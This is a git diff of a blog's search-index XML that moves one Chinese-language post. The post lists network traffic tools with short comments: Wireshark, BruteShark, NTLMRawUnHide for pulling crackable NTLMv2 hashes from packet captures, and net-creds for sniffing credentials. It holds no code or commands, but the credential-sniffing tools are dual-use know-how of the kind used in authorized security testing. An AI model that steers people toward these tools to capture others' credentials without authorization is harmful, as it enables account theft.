-  <entry>
-    <title>配置-工具-流量</title>
-    <url>/2023/12/03/%E9%85%8D%E7%BD%AE-%E5%B7%A5%E5%85%B7-%E6%B5%81%E9%87%8F/</url>
-    <content><![CDATA[<h1>配置-工具-流量</h1>
-<p>记录一下自己用过的流量工具及链接地址</p>
-<h2 id="综合分析">综合分析</h2>
-<table>
-<thead>
-<tr>
-<th>名称</th>
-<th>链接</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Wireshark</td>
-<td><a href="https://www.wireshark.org/download.html">Wireshark · Download</a></td>
-<td>流量鲨鱼，经典中的经典，无需多言，用就完事了</td>
-</tr>
-<tr>
-<td>Brute Shark</td>
-<td><a href="https://github.com/odedshimon/BruteShark">odedshimon/BruteShark: Network Analysis Tool (github.com)</a></td>
-<td>偶然接触到的一款流量分析工具，好处是能自动生成拓扑图之类的，还有一些集成性的hash爆破功能，感觉还行。暂时用的不算特别多，之后再说更多的体验感受吧</td>
-</tr>
-</tbody>
-</table>
-<h2 id="嗅探提取">嗅探提取</h2>
-<table>
-<thead>
-<tr>
-<th>名称</th>
-<th>链接</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>NTLMRawUnHide</td>
-<td><a href="https://github.com/mlgualtieri/NTLMRawUnHide">mlgualtieri/NTLMRawUnHide</a></td>
-<td><a href="http://NTLMRawUnhide.py">NTLMRawUnhide.py</a> 是一个 Python3 脚本，旨在解析网络数据包捕获文件并以可破解的格式提取 NTLMv2 哈希值。该工具旨在从本机 Windows 二进制文件（如 NETSH.EXE 和 PKTMON.EXE）生成的文件中提取 NTLMv2 哈希，而无需转换。（应该是协议问题，之前提取失败过）</td>
-</tr>
-<tr>
-<td>net-creds</td>
-<td><a href="https://github.com/DanMcInerney/net-creds">DanMcInerney/net-creds</a></td>
-<td>相比上面一个，更加综合性的嗅探工具（个人推荐）</td>
-</tr>
-</tbody>
-</table>
-]]></content>
-      <categories>
-        <category>环境配置</category>
-      </categories>
-      <tags>
-        <tag>流量</tag>
       </tags>
   </entry>
   <entry>
@@ -2223,6 +2166,63 @@ Linux下权限的粒度有 拥有者 、群组 、其它组 三种。每个文�
       </categories>
       <tags>
         <tag>linux提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>配置-工具-流量</title>
+    <url>/2023/12/03/%E9%85%8D%E7%BD%AE-%E5%B7%A5%E5%85%B7-%E6%B5%81%E9%87%8F/</url>
+    <content><![CDATA[<h1>配置-工具-流量</h1>
+<p>记录一下自己用过的流量工具及链接地址</p>
+<h2 id="综合分析">综合分析</h2>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>链接</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Wireshark</td>
+<td><a href="https://www.wireshark.org/download.html">Wireshark · Download</a></td>
+<td>流量鲨鱼，经典中的经典，无需多言，用就完事了</td>
+</tr>
+<tr>
+<td>Brute Shark</td>
+<td><a href="https://github.com/odedshimon/BruteShark">odedshimon/BruteShark: Network Analysis Tool (github.com)</a></td>
+<td>偶然接触到的一款流量分析工具，好处是能自动生成拓扑图之类的，还有一些集成性的hash爆破功能，感觉还行。暂时用的不算特别多，之后再说更多的体验感受吧</td>
+</tr>
+</tbody>
+</table>
+<h2 id="嗅探提取">嗅探提取</h2>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>链接</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>NTLMRawUnHide</td>
+<td><a href="https://github.com/mlgualtieri/NTLMRawUnHide">mlgualtieri/NTLMRawUnHide</a></td>
+<td><a href="http://NTLMRawUnhide.py">NTLMRawUnhide.py</a> 是一个 Python3 脚本，旨在解析网络数据包捕获文件并以可破解的格式提取 NTLMv2 哈希值。该工具旨在从本机 Windows 二进制文件（如 NETSH.EXE 和 PKTMON.EXE）生成的文件中提取 NTLMv2 哈希，而无需转换。（应该是协议问题，之前提取失败过）</td>
+</tr>
+<tr>
+<td>net-creds</td>
+<td><a href="https://github.com/DanMcInerney/net-creds">DanMcInerney/net-creds</a></td>
+<td>相比上面一个，更加综合性的嗅探工具（个人推荐）</td>
+</tr>
+</tbody>
+</table>
+]]></content>
+      <categories>
+        <category>环境配置</category>
+      </categories>
+      <tags>
+        <tag>流量</tag>
       </tags>
   </entry>
 </search>
